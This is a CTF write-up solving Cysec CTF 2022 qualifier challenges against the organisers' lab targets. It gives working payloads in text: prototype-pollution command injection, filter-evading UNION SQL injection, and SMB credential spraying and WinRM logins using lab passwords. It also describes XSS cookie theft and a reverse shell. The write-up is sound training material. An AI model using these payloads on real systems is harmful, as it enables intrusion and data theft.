---
layout: default
title : muzec - Cysec CTF 2022 Qualifier Writeup
---

A little words to keep us going XD

```
Do you have what it takes to beat the REST and be the BEST? 
```

![image](https://user-images.githubusercontent.com/69868171/168483729-be459be2-8f3b-412d-b456-c4b84ca27937.png)


Now that is a fun CTF challanges without wasting to much of a time so let jump in already to the fun part solving challanges we are starting with `WEB` category first.


### Easy WEB -- 500 Point

![image](https://user-images.githubusercontent.com/69868171/168483904-32c29500-545a-4fac-9ece-6fed5d57b799.png)

Now that we have the target URL let hit it.

![image](https://user-images.githubusercontent.com/69868171/168483982-3d755b2e-ea01-4e55-9207-9a268d250fa5.png)

Now that is a plain website quickly checking `robots.txt` and we have nothing we just got the same homepage back to us why not check the `source` for hint or way to move forrward.

![image](https://user-images.githubusercontent.com/69868171/168484087-36daee98-c896-439e-90b6-63dccf6da32c.png)

Now that is interesting we can see the `Add user` with a comment but the most intersting one that caught my eyes was `/api?id=source` we all love `API` XD so let check it out.

![image](https://user-images.githubusercontent.com/69868171/168484200-ef6ea876-9632-408b-9ef9-5aee1fc2c435.png)

That is a step forward let see what we have in the source code we just downloaded i will be using my terminal.

![image](https://user-images.githubusercontent.com/69868171/168484462-1d1205b2-0c07-4f14-917d-d19ad054d65e.png)

Let just get the flag already using `Curl` .

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF]
└─$ curl -X GET https://cysec-easy-web.herokuapp.com/api --data "id=gimme-flag"
{"message":"CYSEC{eazy_peasy_l3m0n_squeezy}"}                                                                                                                                                                       
```

Flag:- `CYSEC{eazy_peasy_l3m0n_squeezy}`


### Breadcrumbs -- 1000 Point

![image](https://user-images.githubusercontent.com/69868171/168488158-762d8851-de3c-4860-8f0e-185ecb63c3cb.png)


A fun one seems like we are stealing a cookie lol let hit the webpage to see what we have.

![image](https://user-images.githubusercontent.com/69868171/168488229-069ca61b-aa6a-4694-a3d4-67262edf764b.png)

Seems we have a `login` page and `register` page and we have no valid credentials and it was stated already no `brute forcing` why not get our self a register account yes bro i mean let register XD.


![image](https://user-images.githubusercontent.com/69868171/168488482-988d0427-f4e4-4af1-8439-78940a1afd4c.png)

Now that we have an account let log in.

![image](https://user-images.githubusercontent.com/69868171/168488577-21995164-845f-466d-857a-f178d7296dd2.png)

In a dashboard hehehehehe don't be happy yet it just the normal account i created and seems we have some interesting pages to explore.

![image](https://user-images.githubusercontent.com/69868171/168488658-1b491275-0d52-46ff-9bd7-9acf64deb268.png)

The support page seems cool maybe XSS i just don't know yet but let try using `ngrok` to see if we can get a hit back to the listener i set up.

![image](https://user-images.githubusercontent.com/69868171/168488823-152d709b-6900-4fdd-96c6-b7de8d591a0c.png)

Now back to fill the support page.

![image](https://user-images.githubusercontent.com/69868171/168488853-bbd768c8-3f21-4d0e-9ea9-799a082d7a5f.png)

Let hit the `Submit` and wait for a hit back and boom i got a hit back but no cookie.

![image](https://user-images.githubusercontent.com/69868171/168489715-931b650f-b618-409a-9368-1647103cbddb.png)

Now that is strange right let try using `ngrok` web interface which we can always access on `http://localhost:4040` if you have ngrok running to inspect traffic.

![image](https://user-images.githubusercontent.com/69868171/168489791-64b688bf-4a8f-44f9-b6a9-a70a970e6614.png)

Waiting for some min and boom we got the cookie now let go claim or flag.

```
cnVkZWZpc2g6REM4VG1zd1FldG5kZTlSUTZuNjdOS1hGdHg3VUFyTVFOelJ6SnA2ejQ0Z0NGcGpnNVVlRlJBNUN1Q2JWNnRHSHNKdlRk
```

![image](https://user-images.githubusercontent.com/69868171/168489913-b621971d-2f34-443d-8a63-ae89984a7279.png)

Now we have our flag but am still curious to know what was encoded in the cookie.

![image](https://user-images.githubusercontent.com/69868171/168490005-0979e50e-232f-48f0-b70e-4dc007b38094.png)

Ahhhh you can't guess that right.

A quick one seems `nc` can also get us the cookie.

![image](https://user-images.githubusercontent.com/69868171/168553908-425539b2-47bb-472d-84a4-73232d76acc1.png)


Flag:- `CYSEC{itz__easssssszzzzzzy0876#}`


### The Examiner -- 1000 Point


![image](https://user-images.githubusercontent.com/69868171/168490455-f24da123-28db-4a43-99cc-42f4de8dd473.png)

Seems `The Examiner` web challange is hosted on THM platform let connect to our VPN to access it.

![image](https://user-images.githubusercontent.com/69868171/168491492-eaee8563-2395-4bf9-9860-52e8e5ffa7c8.png)

Deploying and we got our IP not going to waste to much time on using `nmap` to scan for full ports and we got one only which is port `5000` .

![image](https://user-images.githubusercontent.com/69868171/168491572-edf997cb-ea4d-4956-a482-574672a03bad.png)

Boom and we landed on a port scanner page let see what we have on the source code.

![image](https://user-images.githubusercontent.com/69868171/168491612-6873aadc-d9f1-46c5-bd26-d053788cd0fe.png)

Now that is the interesting part of the form let try intercepting our request using burp to undertand it more on how it works.

![image](https://user-images.githubusercontent.com/69868171/168491843-bf503b1e-4c7f-408b-8880-30fb7c0e5cd3.png)

Intercepted and send to repeater now let play with it.

![image](https://user-images.githubusercontent.com/69868171/168491868-c22963e4-26ff-4048-a24d-35882e66a408.png)

But i got `Invalid IP format detected.` i have no reason i keep swaping IP and Port but the same error now seems we already have the source code and our craft code i decided to change the `Content-Type` to `application/json` back in crafting our command.

![image](https://user-images.githubusercontent.com/69868171/168492285-c95c426a-b974-424a-a70d-49c85870342d.png)

Boom and we got it time to get a reverse shell back to our terminal.

![image](https://user-images.githubusercontent.com/69868171/168492426-37003502-e6d6-48a1-9228-1b4ac9ac1132.png)

Listener ready.

![image](https://user-images.githubusercontent.com/69868171/168492455-702f1566-b39c-45c8-ab32-a4f681b4036c.png)

One liner reverse shell payload to execute ready also let hit and we should have a reverse shell back to our terminal.

![image](https://user-images.githubusercontent.com/69868171/168492491-1ad3aa83-942b-4ce6-a957-52fa82d00dea.png)

Now spawning a full TTY shell to make our shell more stable and strong.

![image](https://user-images.githubusercontent.com/69868171/168492716-11fb1990-0955-4082-8c08-4ccf9b88f596.png)

Now it ready time for more enumeration.

![image](https://user-images.githubusercontent.com/69868171/168492807-0f7c6734-e5ad-48da-9227-035f30af8305.png)

User `Rudefish` can run `sudo` let hit gtfobins.

![image](https://user-images.githubusercontent.com/69868171/168492845-8f8b3ee0-be26-48ef-a038-2bb173cf4863.png)

Running that and we are root time to hunt for the flag.

![image](https://user-images.githubusercontent.com/69868171/168493029-344353e6-0561-4c10-907a-5525186f7a5c.png)

Getting into root directory seems we have no flag in it but seems we have the `.bash_history` which store the history of a user command let see what we have in it.

![image](https://user-images.githubusercontent.com/69868171/168493412-77eb7932-93d0-4e17-9c44-417d4c090f3e.png)


![image](https://user-images.githubusercontent.com/69868171/168493375-20b2b21e-62cc-4e40-b6e6-c3a35eca056c.png)

We can see the flag being remove in the `.bash_history` i try using the `find` command to see if the flag is hidden elsewhere but no luck so let check what port is running locally.

![image](https://user-images.githubusercontent.com/69868171/168494114-3c9ac44f-c003-457c-8df7-6ce6a42079a6.png)

Seems we have `SSH` port on which is cool seems we re root we can easily change any user password and have access to it also we can easily change to any  user without a password which can be done with `su sshuser` .

![image](https://user-images.githubusercontent.com/69868171/168494385-ffc351e8-614c-4e21-b40d-46e1d63ba69a.png)

Now we can easily generate a SSH private key for the user `sshuser` so we can easily access SSH with it.

![image](https://user-images.githubusercontent.com/69868171/168494991-38a0d2ec-87b2-42c0-800e-90328cb987b5.png)

```
ssh-keygen -t rsa
```

We have our private key and also added the `authorized_keys` now let try to access SSH.

![image](https://user-images.githubusercontent.com/69868171/168495070-f26c5fb1-e4c7-4fa1-8b94-2d9b2dfb1cf9.png)

Boom we have the flag and we are done.

Flag:- `CYSEC{y0u_scaNNed_ME!}`


### Doctor Strange -- 2000 Point

![image](https://user-images.githubusercontent.com/69868171/168495231-33e8db95-0563-44e8-95cb-d2e21505254b.png)

Man am tired jumping back in.

![image](https://user-images.githubusercontent.com/69868171/168495808-39aef10a-1e87-431c-a449-2814b8b3612d.png)

We have nothing on the source let check for `robots.txt` .

![image](https://user-images.githubusercontent.com/69868171/168495866-45be0e1a-0955-481b-95a4-99c336c8b675.png)

Ahhhh we have something on the `robots.txt` let check `inpect.js` .

![image](https://user-images.githubusercontent.com/69868171/168495999-3dbcb33a-6247-4f3c-9ee2-1fabd842fd9c.png)

```
const { exec } = require('child_process');

var setData = {
    isMalicious: true
};

const run = {
    runCommand: (req, res) => {
        if (!req.body.inspect) {
            return res.status(400).send("Bad request");
        } else {
            try {
                const data = JSON.parse(req.body.inspect);
                if (data.cmdToRun) {
                    const constructUserData = merge(setData, data);
                    if (setData.isMalicious === false) {
                        exec(`ping ${data.cmdToRun}`, (error, stdout, stderr) => {
                            if(error) {
                                return res.status(500).send(error.message)
                            } else if(stderr) {
                                return res.status(500).send(stderr.message);
                            } else {
                                return res.status(200).json(stdout)
                            }
                        });
                    } else {
                        exec(`ping 127.0.0.1`, (error, stdout, stderr) => {
                            if(error) {
                                return res.status(500).send(error.message)
                            } else if(stderr) {
                                return res.status(500).send(stderr.message);
                            } else {
                                return res.status(200).json({message: "Malicious code detected. This is all you get, you hacker", result: stdout})
                            }
                        });
                    }
                } else {
                    return res.status(400).send("What would you like to inspect today?");
                }
            } catch (e) {
                return res.status(400).send(e.message);
            }
        }
    }
};

module.exports = run;

const merge = (target, source) => {
    for(var attr in source) {
        if (typeof(target[attr]) === "object" && typeof(source[attr]) === "object") {
            merge(target[attr], source[attr]);
        } else {
            target[attr] = source[attr];
        }
    }
    return target;
};
```

Now that seems more like a javascript prototype pollution it kind of interesting seems we have to pollute `setData` object at the top here (line 3) to set it to `false` and `POST` request with the payload we got.

```
{"proto": {"isMalicious": false}, "cmdToRun":"<command_injection_payload>">}
```

Payload ready but seems we are missing the right endpoint let hit dirs brute forcing.

![image](https://user-images.githubusercontent.com/69868171/168496646-b81d40a5-6950-45e1-8dcc-a6baebc383ce.png)

We found a login page but no creds to access it trying some default and sql injection payloads got no luck let check the source page.

![image](https://user-images.githubusercontent.com/69868171/168496707-f67e60c1-ac7c-4d37-b3ce-18e0cb739071.png)

Now that is a progress we know it send a `POST` request to `/api/v1/login` anytime we try to login seems like more `API` let try brute forcing the endpoint to avoid missing important part that can help us solve it.

Fire up burp suite and intercept the request changing the rquest method to `POST` since the `API` request on `POST` method now that is funny WTF am typing self XD send to `intruder` .

![image](https://user-images.githubusercontent.com/69868171/168563238-3c3c32dc-6d16-4f5b-acff-2530838f76e7.png)

Now to payloads to select the wordlist seems `medium.txt` would work fine i guess.

![image](https://user-images.githubusercontent.com/69868171/168563618-503413a8-491c-4681-98bc-2c2e6e27bfe5.png)

Now hit on start attack we should get lot of `404 not found` error but from my observation the valid dirs have `400 bad request` .

![image](https://user-images.githubusercontent.com/69868171/168564456-b8e4e01f-99ca-4d87-90b3-d39470fee25a.png)

![image](https://user-images.githubusercontent.com/69868171/168565126-66c0c1ce-0d84-444f-a285-23a79d325b83.png)

A quick note we can also use `ffuf` i just love burp suite.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF]
└─$ ffuf -c -ic -r -u  http://34.205.69.93:8000/api/v1/FUZZ -X POST  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -mc 400
```

![image](https://user-images.githubusercontent.com/69868171/168586678-ca99ddf2-afd0-4ee0-bfd7-3c6b230edf5e.png)


Now that is some useful endpoint let see if i can register an account. Luckily yes i was able to register an account but it was useless unable to get access to the login page with it some back to the `inspect.js` it should be possible we have `inspect` endpoint let confirm it.

![image](https://user-images.githubusercontent.com/69868171/168567341-c8b6ceb4-0be9-48b5-ad76-56f8d1afdd16.png)

Back to burp suite with the endpoint and our sweet payload we created.

```
{"proto": {"isMalicious": false}, "cmdToRun":"<command_injection_payload>"}
```

![image](https://user-images.githubusercontent.com/69868171/168569291-59f8464a-a2ca-4584-9c0d-2f7c61460669.png)

```
{"proto": {"isMalicious": false}, "cmdToRun":"127.0.0.1;id"}
```

Boom we have command injection.

![image](https://user-images.githubusercontent.com/69868171/168569568-d3277215-93fa-44ac-b9fd-b1bca11921b4.png)

We can also using curl.

![image](https://user-images.githubusercontent.com/69868171/168569678-9bd553d9-e0d1-4bf5-bfe6-5639b0eef4a1.png)

Now let get our flag.

![image](https://user-images.githubusercontent.com/69868171/168569918-4ce9fb12-a1e4-48c7-9f9a-d9fe76bc6fad.png)

Done and dusted fun right.

Flag:- `CYSEC{l3t_the_!njection5_r41n.}`


### Password Verifier -- 500 Point

![image](https://user-images.githubusercontent.com/69868171/168572239-f252b7d8-7ff9-4aee-a5e2-4a522082dae5.png)

Now for the reversing part we have no time to waste on it.

![image](https://user-images.githubusercontent.com/69868171/168572593-ddbec505-b18d-4a45-98c6-59a57408753a.png)

Now a quick `strings` on it.

![image](https://user-images.githubusercontent.com/69868171/168572737-751f974e-8242-4121-a5b7-87340d6cc5fd.png)

Now that is quick packed with `upx` we can easily get the real binary by unpacking it XD.

![image](https://user-images.githubusercontent.com/69868171/168573178-f3aa70b3-e3cd-436e-9bb8-519e9a82c20b.png)

Now let grep the flag.

![image](https://user-images.githubusercontent.com/69868171/168573303-59fb3629-4ba0-42ae-b66d-05ba3eeaa92a.png)

That was awesome bro and fast hey you reading you are doing well.

Flag:- `CYSEC{easy_easy_easy_rev_rev_rev}`


### Encore -- 500 Point

![image](https://user-images.githubusercontent.com/69868171/168575010-750bae0d-ac90-4969-8b16-b22fd13eda20.png)

Forensics not my best part of the challanges i sucks on that part really but giving it my all so i download the `jpeg` file.

![image](https://user-images.githubusercontent.com/69868171/168575507-a4070547-da6e-475d-9a30-16615621473c.png)


Nothing nothing bruhhhhhhhhh let `strings` it.

![image](https://user-images.githubusercontent.com/69868171/168575669-df9c4a79-90cd-4bf7-8190-1a348c60ac34.png)

We have something `binwalk` should do the tricks.

![image](https://user-images.githubusercontent.com/69868171/168575770-c95254b8-e559-4802-9350-40b88d01f45c.png)

Now that we have a zip file we can easily extract it but seems the same with the present dir we have already.

![image](https://user-images.githubusercontent.com/69868171/168575969-1394e780-34ae-4fb8-95cd-ea670fd5a9ad.png)

Interesting more like a `stegsnow` to me the space and the password is a hint i guess.

![image](https://user-images.githubusercontent.com/69868171/168576469-525a1752-2787-438f-b805-95640e7c8057.png)

Let give it a try bruhhh.

![image](https://user-images.githubusercontent.com/69868171/168577764-8c31e9bb-54ac-4d0b-8b4e-523484272cad.png)

Now that is strange but according to the `Cysec Mod` @Rudefish.

![image](https://user-images.githubusercontent.com/69868171/168577919-b10b6117-7369-4156-a6b0-8a80eb031b87.png)

Ahhh which mean we are done since we have the `Password` already.


### Ancient Languages -- 300 Point

![image](https://user-images.githubusercontent.com/69868171/168578178-48f32e9c-0e99-4dac-ac69-2255ed230241.png)

We have a wav file let download it to confirm.

![image](https://user-images.githubusercontent.com/69868171/168578884-1bfad4ae-ab41-43e3-a79d-e7ba656f2f05.png)

Let try `Morse Decoder` on it first.

![image](https://user-images.githubusercontent.com/69868171/168579382-59ca95a7-774b-478e-b83c-b005110f7cca.png)

Wow that was fast right.

Flag: `CYSEC{m0rse_is_0ld_really_0ld}`


### Happy Song -- 1000 Point

![image](https://user-images.githubusercontent.com/69868171/168580944-f31b9edb-d90f-48c9-adfe-6f2aad2f125f.png)

Pretty sure not a `morse` lol why because i try it already no luck.

![image](https://user-images.githubusercontent.com/69868171/168581930-3428ecb1-e06f-472c-86e2-7ee3d9cf9093.png)

We always check with `strings` .

![image](https://user-images.githubusercontent.com/69868171/168582810-0a951cc8-5b7b-40aa-acc9-d229101f95cf.png)

A hint maybe or not but am trying it.

![image](https://user-images.githubusercontent.com/69868171/168583071-e4f24a6f-7098-493d-8c26-13496eb791f5.png)

I seriously have no idea of what am doing :sweat_smile: :sweat_smile: .

![image](https://user-images.githubusercontent.com/69868171/168583440-f5f05902-e0b3-4bd6-9256-f92842f23efa.png)

Here we go again with another hint. seems i will be using `https://www.freephototool.com/` so i uploaded the raw file on it set up the `width` to 1588 and the `height` to 1570 and boom i got something reflected back.

![image](https://user-images.githubusercontent.com/69868171/168585218-40dd9051-5459-4929-9028-e3c9d747fe16.png)

Boom Boom and we got it.

![image](https://user-images.githubusercontent.com/69868171/168585569-41f5cc20-0f4d-446e-af6d-c0c9dbd4f3d3.png)

Flag:- `CYSEC{just_b3_HAPPY}`

### Keep It Simple, Stupid -- 5000 Point


![image](https://user-images.githubusercontent.com/69868171/168587763-37ced237-9289-42ad-b0b6-235c20c60cc3.png)

Bruhhh i so much love Pwn2Own eh B2R i always state it in all my write up we always start with what `nmap` enumeration is everything.

```
Note: You may need to add cysec.local to your hosts file

┌──(root💀Muzec-Security)-[/home/…/CTFPlayground/CysecCTF/cysec/nmap]
└─# echo "54.234.92.201 cysec.local" >> /etc/hosts      
```

Now for the nmap result.

```
# Nmap 7.91 scan initiated Fri May 13 08:18:52 2022 as: nmap -sC -sV -oN nmap/normal.tcp -p25,445,587,80,3389,389 54.234.92.201
Nmap scan report for cysec.local (54.234.92.201)
Host is up (0.63s latency).

PORT     STATE SERVICE       VERSION
25/tcp   open  smtp?
| fingerprint-strings: 
|   NULL: 
|_    421 Server busy, too many connections
|_smtp-commands: Couldn't establish connection on port 25
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: IIS Windows Server
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cysec.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
587/tcp  open  submission?
| fingerprint-strings: 
|   NULL: 
|_    421 Server busy, too many connections
|_smtp-commands: Couldn't establish connection on port 587
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CYSEC
|   NetBIOS_Domain_Name: CYSEC
|   NetBIOS_Computer_Name: EC2AMAZ-E36BFJ9
|   DNS_Domain_Name: cysec.local
|   DNS_Computer_Name: EC2AMAZ-E36BFJ9.cysec.local
|   DNS_Tree_Name: cysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-13T10:19:42+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-E36BFJ9.cysec.local
| Not valid before: 2022-02-22T22:23:41
|_Not valid after:  2022-08-24T22:23:41
|_ssl-date: 2022-05-13T10:20:19+00:00; +2h59m55s from scanner time.
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port25-TCP:V=7.91%I=7%D=5/13%Time=627E0661%P=x86_64-pc-linux-gnu%r(NULL
SF:,27,"421\x20Server\x20busy,\x20too\x20many\x20connections\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port587-TCP:V=7.91%I=7%D=5/13%Time=627E0661%P=x86_64-pc-linux-gnu%r(NUL
SF:L,27,"421\x20Server\x20busy,\x20too\x20many\x20connections\r\n");
Service Info: Host: EC2AMAZ-E36BFJ9; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h59m54s, deviation: 0s, median: 2h59m54s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-13T10:19:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 13 08:22:35 2022 -- 1 IP address (1 host up) scanned in 222.69 seconds
```

Cutting down to the chase already you can check my past write up if you are still lost on how i got the Ports. Now seems we have `SMB` always go for the low hanging fruit first.

```
┌──(muzec㉿Muzec-Security)-[~/…/CTFPlayground/CysecCTF/cysec/nmap]
└─$ smbclient -L //54.234.92.201/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/…/CTFPlayground/CysecCTF/cysec/nmap]
```

Seems we have no shares yet possible we need a creds but seems we have HTTP port open let see what we have on the page.

![image](https://user-images.githubusercontent.com/69868171/168589843-458d0011-0d95-4317-af81-22d030da15b4.png)

Windows yes bruhh i think you notice already from the `nmap` scan gosh don't look down on yourself man you are cool and l33t XD now back to what we are doing seems we have nothing yet on the page brute forcing for hidden dirs and subdomain would be the next step right now let hit it.

```
┌──(muzec㉿Muzec-Security)-[~/…/CTFPlayground/CysecCTF/cysec/nmap]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cysec.local" -u http://cysec.local
```

Now that is to Fuzz for sub-domain way fast and we found something.

![image](https://user-images.githubusercontent.com/69868171/168591533-9a50b760-8650-4091-b9bb-0ef02e417ccd.png)

Now you already know what to do right add `secret.cysec.local` to your `/etc/hosts` file again.

![image](https://user-images.githubusercontent.com/69868171/168591822-236832a6-4902-48be-ae50-abd98b2fd26f.png)

Just like that let see what we have when we access it.

![image](https://user-images.githubusercontent.com/69868171/168592223-a7832f39-528f-4a5e-a74a-2bc86a9b4fda.png)

Now seems we have nothing even after checking the source page let FUZZ the endpoint.

```
┌──(muzec㉿Muzec-Security)-[~/…/CTFPlayground/CysecCTF/cysec/nmap]
└─$ ffuf -c -ic -r -u  http://secret.cysec.local/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
A quick note we can always add to check for extension with the switch `-e txt,php,phtml,bak,old` incase to avoid missing some goodies at time. 

![image](https://user-images.githubusercontent.com/69868171/168592475-6801436d-ce3b-4e94-a761-6db168768228.png)

Now that look promising the `Backups`.

![image](https://user-images.githubusercontent.com/69868171/168593011-2acafb39-c1e2-4974-99d5-50ba1222ae40.png)

Now that is a lead forward  we have wordlists for both `users` and `passwords` .

```
jhammond
ippsec
pcyber
jmorgan
jsmith
sliberty
eyeager
jbiden
```

Man i can't paste the passwords list here it to long i decided to brute force `SMB` with the wordlists i got using `cme` you have no idea what is that right it `crackmapexec` .

```
crackmapexec smb cysec.local -u users.txt -p passwords.txt
```

Let it fly and wait wait wait XD.

![image](https://user-images.githubusercontent.com/69868171/168594258-debff400-1b6f-461c-873b-8ca9aa0a3db0.png)

Now we have creds for `SMB` let confirm it.

```
[+] cysec.local\jsmith:Password@123
```

![image](https://user-images.githubusercontent.com/69868171/168594729-a4b5e03e-d722-48b7-85b4-c90bdc27ec15.png)

Shares shares loot loot hehehehehehehe we all love that right now let loot some stuffs first share on my mind is `confidential` let see what we can loot.

![image](https://user-images.githubusercontent.com/69868171/168595686-4ed4323d-e321-4a26-aa8e-81c1421a51ad.png)

Now that is strange the first time i work on the machine i only found one file which is `Email.txt` guess it for one of the player so i downloaded `Email.txt` .

![image](https://user-images.githubusercontent.com/69868171/168595987-3f8f83b1-0086-41a1-9f26-81af7c2eb718.png)

Now let `cat` it.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF/cysec]
└─$ cat Email.txt                                          
From HR Manager <hlevi@cysec.local>,

Good day everyone, I hope this email meets you well.

Due to the amount of delay we encountered during the last self-appraisal week, one of the the IT team members, John Smith, has decide to automate the process. Things should do smoother now.

Thank you and enjoy the rest of your day.

- To all employess.                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF/cysec]
```

Seems it pointing us to `jsmith` home `dirs` or should i just call it `desktop` seems we are working on windows machine XD. Now back to the shares.

![image](https://user-images.githubusercontent.com/69868171/168597361-057ac5b7-f4a8-4aea-a051-5025ccdb0a44.png)

Now moving to `jsmith` home desktop hehehehe it sound lame.

![image](https://user-images.githubusercontent.com/69868171/168597652-cb172b2f-e17b-4280-b477-54c0d79622a4.png)

Guess that is what we need let download it.

![image](https://user-images.githubusercontent.com/69868171/168597851-0431effb-d069-414d-9161-015887fa30ad.png)

Now that is a strong password for user `hlevi` now time to take it to the next level. Let try to scan if we have `winrm port` open.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF/cysec]
└─$ nmap -sC -sV -p 5985 cysec.local           
Starting Nmap 7.91 ( https://nmap.org ) at 2022-05-16 11:01 WAT
Nmap scan report for cysec.local (54.234.92.201)
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds
```

Now that is confirm we can use the `evil-winrm` to access the machine with the creds we just got.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground/CysecCTF/cysec]
└─$ evil-winrm -i cysec.local  -u hlevi -p SuperDuperSecurePassword1!
```

Boom we should be in 3 2 1 .

![image](https://user-images.githubusercontent.com/69868171/168599003-b8812cd7-b7ff-4847-a4e4-6399edbef900.png)

Now that we are in let to enumerate about our present user `hlevi` what group is he on maybe any hidden comments.

```
net users hlevi
```

![image](https://user-images.githubusercontent.com/69868171/168599447-1d6820ff-fef2-402b-b30c-796ec4566c65.png)

Now that look like a password and we still have a user which we are still missing a creds for i guess let try confirming it with `cme` possible it a jackpot .

![image](https://user-images.githubusercontent.com/69868171/168599990-7e25bf27-a421-4d39-a860-09690203c4c4.png)

Boom that is a big catch let try accessing it with `evil-winrm` .

![image](https://user-images.githubusercontent.com/69868171/168600393-e2cb1150-3282-4f34-8879-384e2bda1781.png)

We are in and seems our user is in the `domain admin` group which is a big catch really.

![image](https://user-images.githubusercontent.com/69868171/168600657-ee62c3cd-f91d-451c-bc53-32e8b842b47f.png)

We should be able to access the `adminisrator` desktop now to get the flag.

![image](https://user-images.githubusercontent.com/69868171/168600993-8f807e50-113b-4eb0-aa0d-f5402cde943e.png)

Now that is done we have the flag but man am still not happy with that let get access to the `administrator` account. Let use `secretsdump.py`  to get the the `administrator` hashes now use `PTH` to get access to it using `evil-winrm` .

![image](https://user-images.githubusercontent.com/69868171/168602678-ab29cdd2-4aa9-42a1-b462-fbb5ebdaea10.png)

But when i try it no luck guess only `eyeager` with the password is the way.


Flag:- `CYSEC{itz_all_n1ce&34sy}`

### IAmBot -- 2000 Point

![image](https://user-images.githubusercontent.com/69868171/168629720-12b44e4a-d7ad-45d6-bfb6-e3d7e9959ac1.png)


Telegram bot cool let hit it.

![image](https://user-images.githubusercontent.com/69868171/168630054-11435350-038d-4510-a4e3-d1a1f5a1d082.png)

Seems we can register and login but we have no creds let register first to know more about what we are dealing with.

![image](https://user-images.githubusercontent.com/69868171/168630506-0b97531e-edf1-481c-a34c-87345f369a3a.png)

I aready have an account let just log in.

![image](https://user-images.githubusercontent.com/69868171/168630776-d85c9367-1fc0-4449-9bbf-526517a9d4f3.png)

Now that is a jwt token let try checking our profile.

![image](https://user-images.githubusercontent.com/69868171/168630956-d59aabb2-f52d-4ece-a893-a90a72a9064f.png)

Hmmm nothing not that useful let try some injection on the login command.

![image](https://user-images.githubusercontent.com/69868171/168631249-2dd8f3bc-d77c-48fe-aef9-d3f18aead053.png)

Dead end to me ahhhh let check some of the commands.

![image](https://user-images.githubusercontent.com/69868171/168631425-6be6de1a-1fa3-42de-8b7a-d1600ad71209.png)

Let try the `forgotPassword ` command with some simple sql injection payloads.

![image](https://user-images.githubusercontent.com/69868171/168631662-05d0dbb3-a928-49a9-b5e0-44f735f5f12c.png)

That look strange and kind of interesting getting the alert `Hacking attempted detected. This information has been logged and reported to our security team.` is it possible it vulnerable to sql injection.

![image](https://user-images.githubusercontent.com/69868171/168632247-5422348d-35e9-4dc9-ad72-0b61e83d5e2c.png)

Now that is a error i love seeing. Let dig more and see what we can get.

![image](https://user-images.githubusercontent.com/69868171/168633048-3e16ba26-dc88-4115-9213-59af18fcd4ee.png)

I was able to get all users username and hashes but not that useful now i think it time to enumerate the number of columns first to avoid being detected there is an easy bypass, which is to replace all whitespaces with /**/ (comments).

![image](https://user-images.githubusercontent.com/69868171/168634251-902a13c3-7449-4dc9-8507-3db4bf7c117c.png)

```
/forgotPassword admin'/**/UNION/**/SELECT/**/1# test
```

![image](https://user-images.githubusercontent.com/69868171/168634528-98c4ea44-25e2-4569-9393-e3246fb33a8b.png)

```
/forgotPassword admin'/**/UNION/**/SELECT/**/1,2# test
```
![image](https://user-images.githubusercontent.com/69868171/168634671-17c73ec4-c413-46a2-a3f3-123111f89bc4.png)

```
/forgotPassword admin'/**/UNION/**/SELECT/**/1,2,3# test
```
Hehehehe no error seems we found the numbers of columns which is 3 now that a lead to move forward. Let confirm the version.

![image](https://user-images.githubusercontent.com/69868171/168635618-d58df8ff-ba6d-4778-99e0-e23c22940156.png)

```
/forgotPassword admin'/**/UNION/**/SELECT/**/@@version,2,3# test
```

Now let get the database and tables, columns so we can dump everything.

![image](https://user-images.githubusercontent.com/69868171/168639241-baf95ab1-6d73-4859-aca6-4f7a24c42e04.png)

Database command;- 
```
/forgotPassword admin'/**/UNION/**/SELECT/**/concat(schema_name),2,3/**/FROM/**/information_schema.schemata# test
```

![image](https://user-images.githubusercontent.com/69868171/168639720-632592bb-dddd-4679-8666-d4b537bd3084.png)

Tables command;-

```
/forgotPassword admin'/**/UNION/**/SELECT/**/concat(table_name),2,3/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema='chatbot'# test
```

![image](https://user-images.githubusercontent.com/69868171/168643048-521eeb81-9733-4217-9aed-25c6923dc9c9.png)

Columns command;-

```
/forgotPassword admin'/**/UNION/**/SELECT/**/concat(column_name,","),2,3/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'# test
```

Now for the fun part time to dump all XD.

![image](https://user-images.githubusercontent.com/69868171/168644324-a9988698-3de7-45bc-be83-a63d20f47de9.png)

```
